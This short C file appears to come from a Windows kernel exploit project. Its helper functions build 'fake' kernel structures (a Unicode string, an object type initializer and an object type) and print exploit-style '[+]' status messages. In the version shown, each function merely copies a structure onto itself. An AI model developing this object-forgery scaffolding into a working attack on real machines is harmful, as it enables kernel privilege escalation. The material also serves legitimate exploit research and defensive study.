#include "exploit.h"

void initialize_unicode_string(PUNICODE_STRING input_unicode_string)
{
	UNICODE_STRING unicode_string = *input_unicode_string;

	*input_unicode_string = unicode_string;
}

void initialize_object_type_initializer(POBJECT_TYPE_INITIALIZER input_object_type_initializer)
{
	OBJECT_TYPE_INITIALIZER object_type_initializer = *input_object_type_initializer;

	*input_object_type_initializer = object_type_initializer;
}

void initialize_object_type(POBJECT_TYPE input_object_type)
{
	OBJECT_TYPE object_type = *input_object_type;

	*input_object_type = object_type;
}

void initialize_type_info_structs(PUNICODE_STRING input_unicode_string, POBJECT_TYPE_INITIALIZER input_object_type_initializer, POBJECT_TYPE input_object_type)
{
	initialize_unicode_string(input_unicode_string);
	printf("\n[+] Initialized fake unicode string.");

	initialize_object_type_initializer(input_object_type_initializer);
	printf("\n[+] Initialized fake object type initializer.");

	initialize_object_type(input_object_type);
	printf("\n[+] Initialized fake object type.");
}